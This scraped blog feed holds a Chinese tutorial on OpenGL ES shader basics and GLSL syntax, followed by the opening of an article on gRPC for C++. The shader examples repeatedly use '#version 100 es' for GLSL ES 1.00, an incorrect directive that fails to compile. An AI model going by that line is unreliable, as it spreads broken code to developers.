                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、着色器的基本概念</h3>
<p><strong>着色器</strong>是用一种类似 C 的语言（GLSL）编写的、在 GPU 上运行的小程序。它们不是你写的传统“应用代码”，而是专门为处理图形渲染管线中的特定阶段而设计的。</p>
<p><strong>核心思想</strong>：传统的固定渲染管线是“黑盒”，你只能配置参数。而<strong>可编程渲染管线</strong>允许你编写这些小程序，从而完全控制顶点如何变换、像素如何着色的过程，实现无限可能的效果。</p>
<p>在 OpenGL ES 2.0/3.0 中，最重要的两个可编程着色器是：</p>
<ol>
<li>
<p><strong>顶点着色器</strong>：</p>
<ul>
<li><strong>执行频率</strong>：<strong>每个顶点执行一次</strong>。</li>
<li><strong>核心任务</strong>：
<ul>
<li><strong>坐标变换</strong>：将顶点从模型空间，经过模型、视图、投影矩阵变换，最终到屏幕的裁剪空间。</li>
<li><strong>传递数据</strong>：计算并输出后续阶段（如片段着色器）所需的数据，如颜色、纹理坐标、法线等。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>片段着色器</strong>：</p>
<ul>
<li><strong>执行频率</strong>：<strong>每个片段（可粗略理解为像素候选）执行一次</strong>。</li>
<li><strong>核心任务</strong>：
<ul>
<li><strong>决定最终颜色</strong>：计算该片段的最终颜色值。这包括纹理采样、光照计算、颜色混合等所有决定像素外观的操作。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>渲染流程简化视图</strong>：</p>
<pre><code class="hljs language-rust" lang="rust">顶点数据 <span class="hljs-punctuation">-&gt;</span> [顶点着色器]（处理每个顶点）<span class="hljs-punctuation">-&gt;</span> 图元装配/光栅化 <span class="hljs-punctuation">-&gt;</span> [片段着色器]（处理每个片段）<span class="hljs-punctuation">-&gt;</span> 测试与混合 <span class="hljs-punctuation">-&gt;</span> 屏幕像素
</code></pre>
<h3 data-id="heading-1">二、GLSL 语法核心要点</h3>
<p>GLSL（OpenGL Shading Language）是为图形计算量身定制的语言，语法类似C，但有显著的不同。</p>
<h4 data-id="heading-2">1. 版本声明</h4>
<p><strong>必须是第一行</strong>（注释除外）。OpenGL ES 的 GLSL 有特殊版本号。</p>
<pre><code class="hljs language-glsl" lang="glsl">// OpenGL ES 2.0 对应 GLSL ES 1.00
#version 100 es

// OpenGL ES 3.0 对应 GLSL ES 3.00
#version 300 es
</code></pre>
<h4 data-id="heading-3">2. 变量类型与限定符</h4>
<p>这是 GLSL 最关键的特性之一，用于定义数据的来源、去向和性质。</p>
<ul>
<li>
<p><strong><code>attribute</code>（仅用于顶点着色器，ES 2.0） / <code>in</code>（ES 3.0）</strong>：</p>
<ul>
<li>定义<strong>逐顶点</strong>的输入数据。每个顶点可以有不同的值。</li>
<li>例如：顶点位置、顶点颜色、顶点法线、纹理坐标。</li>
</ul>
<pre><code class="hljs language-glsl" lang="glsl">// ES 2.0
attribute vec4 aPosition;
attribute vec2 aTexCoord;
// ES 3.0
in vec4 aPosition;
</code></pre>
</li>
<li>
<p><strong><code>uniform</code></strong>：</p>
<ul>
<li>定义<strong>全局</strong>、<strong>恒定</strong>的输入变量。在一次绘制调用中，所有顶点和片段访问到的 <code>uniform</code> 值都是相同的。</li>
<li>例如：变换矩阵、光源位置、颜色、时间。</li>
</ul>
<pre><code class="hljs language-glsl" lang="glsl">uniform mat4 uMVPMatrix; // 模型-视图-投影矩阵
uniform float uTime;
</code></pre>
</li>
<li>
<p><strong><code>varying</code>（ES 2.0） / <code>out</code>（顶点着色器） &amp; <code>in</code>（片段着色器，ES 3.0）</strong>：</p>
<ul>
<li>用于从<strong>顶点着色器向片段着色器传递数据</strong>。</li>
<li>顶点着色器为每个顶点计算出该值，在光栅化过程中，这些值会被<strong>插值</strong>，然后片段着色器收到的是<strong>插值后</strong>的、对应于当前片段的值。</li>
<li>例如：将顶点颜色、纹理坐标、从顶点着色器计算出的光照强度传递给片段着色器。</li>
</ul>
<pre><code class="hljs language-glsl" lang="glsl">// ES 2.0
// 顶点着色器中
varying vec2 vTexCoord;
// 片段着色器中
varying vec2 vTexCoord;

// ES 3.0
// 顶点着色器中
out vec2 vTexCoord;
// 片段着色器中
in vec2 vTexCoord;
</code></pre>
</li>
<li>
<p><strong>精度限定符</strong>：</p>
<ul>
<li>GLSL ES 特有，用于指定变量的计算精度，平衡速度和资源。<strong>片段着色器中必须声明浮点数精度</strong>。</li>
<li><code>lowp</code>（低精度）、<code>mediump</code>（中精度）、<code>highp</code>（高精度）。</li>
</ul>
<pre><code class="hljs language-glsl" lang="glsl">precision mediump float; // 在片段着色器开头声明默认浮点数精度
uniform highp sampler2D uTexture; // 纹理采样器通常需要高精度
varying lowp vec4 vColor; // 颜色数据可能用低精度就够了
</code></pre>
</li>
</ul>
<h4 data-id="heading-4">3. 基本数据类型</h4>
<ul>
<li><code>float</code>, <code>int</code>, <code>bool</code>： 标量。</li>
<li><code>vec2</code>, <code>vec3</code>, <code>vec4</code>： 包含2、3、4个浮点数的向量。常用于表示位置、颜色(RGBA)、纹理坐标。</li>
<li><code>mat2</code>, <code>mat3</code>, <code>mat4</code>： 2x2, 3x3, 4x4 浮点数矩阵。</li>
<li><code>sampler2D</code>, <code>samplerCube</code>： <strong>纹理采样器</strong>，是用于从纹理中读取数据的特殊类型。</li>
</ul>
<h4 data-id="heading-5">4. 内置变量与函数</h4>
<ul>
<li><strong>顶点着色器输出</strong>：
<pre><code class="hljs language-glsl" lang="glsl">vec4 gl_Position; // 必须赋值！表示顶点在裁剪空间中的最终位置。
float gl_PointSize; // 可选，绘制点精灵时的大小。
</code></pre>
</li>
<li><strong>片段着色器输出</strong>：
<pre><code class="hljs language-glsl" lang="glsl">// ES 2.0
vec4 gl_FragColor; // 必须赋值！表示该片段的最终颜色。
// ES 3.0
out vec4 oFragColor; // 自定义输出变量，可以多个（用于多渲染目标）。
</code></pre>
</li>
<li><strong>内置函数</strong>： GLSL 提供了丰富的数学和图形函数。
<ul>
<li>数学： <code>sin</code>, <code>cos</code>, <code>pow</code>, <code>sqrt</code>, <code>abs</code></li>
<li>几何： <code>dot</code>（点积）, <code>cross</code>（叉积）, <code>normalize</code>（归一化）, <code>length</code>（长度）</li>
<li>纹理： <code>texture2D</code>(ES 2.0) / <code>texture</code>(ES 3.0)（纹理采样）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">三、一个完整的简单例子 (OpenGL ES 2.0)</h3>
<p><strong>顶点着色器 (<code>vertex_shader.glsl</code>)</strong>：</p>
<pre><code class="hljs language-glsl" lang="glsl">#version 100 es // ES 2.0
// 输入：顶点的属性
attribute vec4 aPosition;
attribute vec4 aColor;
// 输出：传递给片段着色器的变量（会被插值）
varying vec4 vColor;
// 全局常量：变换矩阵
uniform mat4 uMVPMatrix;

void main() {
    // 核心任务：计算裁剪空间坐标
    gl_Position = uMVPMatrix * aPosition;
    // 将顶点颜色传递给片段着色器
    vColor = aColor;
}
</code></pre>
<p><strong>片段着色器 (<code>fragment_shader.glsl</code>)</strong>：</p>
<pre><code class="hljs language-glsl" lang="glsl">#version 100 es
// ES 2.0 片段着色器必须声明默认浮点精度
precision mediump float;
// 输入：从顶点着色器传来（经过插值）
varying vec4 vColor;

void main() {
    // 核心任务：决定最终颜色
    // 这里简单地使用插值后的颜色
    gl_FragColor = vColor;
}
</code></pre>
<h3 data-id="heading-7">四、OpenGL ES 3.0 的关键语法变化</h3>
<ol>
<li><strong><code>in</code>/<code>out</code> 取代 <code>attribute</code>/<code>varying</code></strong>：声明更清晰，统一了顶点和片段着色器的输入输出语法。</li>
<li><strong>自定义片段输出</strong>：不再使用 <code>gl_FragColor</code>，而是自己声明 <code>out vec4 outColor;</code>。</li>
<li><strong>纹理函数统一</strong>：<code>texture2D</code>, <code>textureCube</code> 等函数统一为 <code>texture</code> 函数。</li>
<li><strong>更严格的语法</strong>：例如，不再支持数组和循环的不确定索引（除非使用特殊限定符）。</li>
</ol>
<p><strong>ES 3.0 等价示例片段</strong>：</p>
<pre><code class="hljs language-glsl" lang="glsl">// 顶点着色器开头
#version 300 es
in vec4 aPosition;
out vec4 vColor;
// 片段着色器开头
#version 300 es
precision mediump float;
in vec4 vColor;
out vec4 outColor; // 自定义输出
</code></pre>
<h3 data-id="heading-8">五、调试与最佳实践</h3>
<ul>
<li><strong>错误检查</strong>：在C++/Java端，<strong>务必</strong>在编译链接着色器后，使用 <code>glGetShaderInfoLog</code> 和 <code>glGetProgramInfoLog</code> 获取错误信息。这是调试着色器问题的<strong>唯一可靠途径</strong>。</li>
<li><strong>从简单开始</strong>：先让一个最简单的着色器（如直接输出颜色）工作，再逐步增加复杂度（矩阵、纹理、光照）。</li>
<li><strong>注意精度</strong>：在移动设备上，不当的精度选择可能导致性能下降或渲染瑕疵。通常 <code>mediump</code> 是安全且高效的起点。</li>
<li><strong>避免条件分支</strong>：GPU 擅长并行处理相同指令流，复杂的 <code>if-else</code> 或循环会显著降低性能。尽量使用步进函数、混合等方式替代。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++ 程序员一定要会的 RPC 框架：gRPC 从原理到实战，一次写通服务端和客户端]]></title>    <link>https://juejin.cn/post/7591993600389726259</link>    <guid>https://juejin.cn/post/7591993600389726259</guid>    <pubDate>2026-01-06T06:07:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591993600389726259" data-draft-id="7591792747776376842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++ 程序员一定要会的 RPC 框架：gRPC 从原理到实战，一次写通服务端和客户端"/> <meta itemprop="keywords" content="后端,gRPC,C++"/> <meta itemprop="datePublished" content="2026-01-06T06:07:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GetcharZp"/> <meta itemprop="url" content="https://juejin.cn/user/4328150938692264"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++ 程序员一定要会的 RPC 框架：gRPC 从原理到实战，一次写通服务端和客户端
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4328150938692264/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GetcharZp
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:07:42.000Z" title="Tue Jan 06 2026 06:07:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><blockquote>
<p>在分布式系统里，服务之间到底是怎么“像函数调用一样通信”的？<br/>
本文从 gRPC 的设计思想讲起，系统梳理它的能力、优缺点和真实使用场景，并用 <strong>C++ 实现一个完整可跑的 gRPC 服务端和客户端</strong>，一步到位，帮你真正理解 gRPC 在工程中的价值。</p>
<p>Github: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgrpc%2Fgrpc" target="_blank" title="https://github.com/grpc/grpc" ref="nofollow noopener noreferrer">github.com/grpc/grpc</a>
官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgrpc.io%2Fdocs%2Flanguages%2Fcpp%2Fquickstart%2F" target="_blank" title="https://grpc.io/docs/languages/cpp/quickstart/" ref="nofollow noopener noreferrer">grpc.io/docs/langua…</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/985f6f97eb504f3ca0e9b9179dac48fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284462&amp;x-signature=s1I6XTVDwn2sJ4tsWFpMiTbvvDo%3D" alt="b1a13da1e5769bb8721984afde9b99b1.png" loading="lazy"/></p>
<h3 data-id="heading-0">为什么越来越多的系统在用 gRPC？</h3>
<p>在早期的服务通信中，我们最常见的方案无非两种：<br/>
一种是 <strong>HTTP + JSON</strong>，简单直观，但性能和规范性始终是瓶颈；<br/>
另一种是自己造 RPC 轮子，成本高、维护难、协议混乱。</p>
<p>gRPC 的出现，本质上就是在解决一个问题：<br/>
<strong>如何让跨进程、跨机器的服务调用，像本地函数调用一样自然？</strong></p>
<p>gRPC 是 Google 开源的一套高性能 RPC 框架，核心特点有三个：</p>
<ul>
<li>基于 <strong>HTTP/2</strong></li>
<li>使用 <strong>Protocol Buffers</strong> 作为接口描述和序列化协议</li>
<li>强约束的接口定义</li>
</ul>
<p>这三个设计，决定了 gRPC 天生就不是“写给小脚本用的”，而是面向<strong>中大型系统、微服务架构</strong>的通信基础设施。</p>
<h3 data-id="heading-1">优点和缺点</h3>
<p><strong>优点：</strong></p>
<ul>
<li>性能好，延迟低</li>
<li>接口规范清晰，适合团队协作</li>
<li>工具链成熟，自动生成代码</li>
<li>对微服务非常友好</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>学习成本高于 REST</li>
<li>调试不如 HTTP 直观</li>
<li>对浏览器不友好（需要 gRPC-Web）</li>
<li>protobuf 一旦设计不好，后期改动成本高</li>
</ul>
